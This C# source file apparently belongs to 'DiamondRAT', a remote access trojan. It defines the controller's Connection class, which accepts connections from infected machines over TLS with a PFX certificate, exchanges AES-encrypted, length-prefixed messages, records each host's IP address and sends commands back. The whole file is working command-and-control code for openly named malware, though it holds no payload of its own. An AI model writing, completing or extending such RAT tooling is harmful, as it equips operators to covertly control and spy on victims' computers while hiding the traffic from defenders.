using common;
using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace DiamondRAT
{
    public class Connection
    {
        public delegate void GotInfoEventHandler(Connection client, string Message);
        public delegate void DisconnectedEventHandler(Connection client);
        public GotInfoEventHandler GotInfo;
        public DisconnectedEventHandler Disconnected;

        private X509Certificate _cert;
        private TcpClient _client;
        private Stream _ns;
        public string IPAddress;

        public Connection(TcpClient client, string pfx)
        {
            this._client = client;

            if (File.Exists(pfx))
            {
                _cert = new X509Certificate2(pfx);
                SslStream sslStream = new SslStream(client.GetStream(), false, null, null);
                sslStream.AuthenticateAsServer(_cert, false, SslProtocols.Tls, false);
                _ns = sslStream;
            }
            else
                _ns = client.GetStream();

            Thread recv = new Thread(() =>
            {
                try
                {
                    while (true)
                    {
                        byte[] buf = FullRead(4);
                        if (buf == null)
                            break;

                        int length = BitConverter.ToInt32(buf, 0);
                        if (length <= 0 || length > 102400000)
                            break;

                        buf = FullRead(length);
                        if (buf == null)
                            break;

                        GotInfo?.Invoke(this, aes.AES_Decrypt(buf, global.Key));
                    }

                    Disconnected?.Invoke(this);
                }
                catch (Exception ex)
                {
                    Disconnected?.Invoke(this);
                }
            });
            recv.IsBackground = true;
            recv.Start();

            IPAddress = client.Client.RemoteEndPoint.ToString().Remove(client.Client.RemoteEndPoint.ToString().LastIndexOf(":"));
        }

        private byte[] FullRead(int length)
        {
            try
            {
                byte[] buf = new byte[8096];
                int bytesLeft = length, read = 0;
                using (MemoryStream ms = new MemoryStream())
                {
                    while (bytesLeft > 0)
                    {
                        if (bytesLeft < buf.Length)
                            read = _ns.Read(buf, 0, bytesLeft);
                        else
                            read = _ns.Read(buf, 0, buf.Length);
                        if (read == 0)
                            break;
                        ms.Write(buf, 0, read);
                        bytesLeft -= read;
                    }

                    if (ms.Length > 0)
                        return ms.ToArray();
                    else
                        return null;
                }
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public void Send(string message)
        {
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    byte[] buf = aes.AES_Encrypt(message, global.Key);
                    ms.Write(BitConverter.GetBytes(buf.Length), 0, 4);
                    ms.Write(buf, 0, buf.Length);

                    _ns.Write(ms.ToArray(), 0, (int)ms.Length);
                }
            }
            catch (Exception ex)
            {

            }
        }
    }
}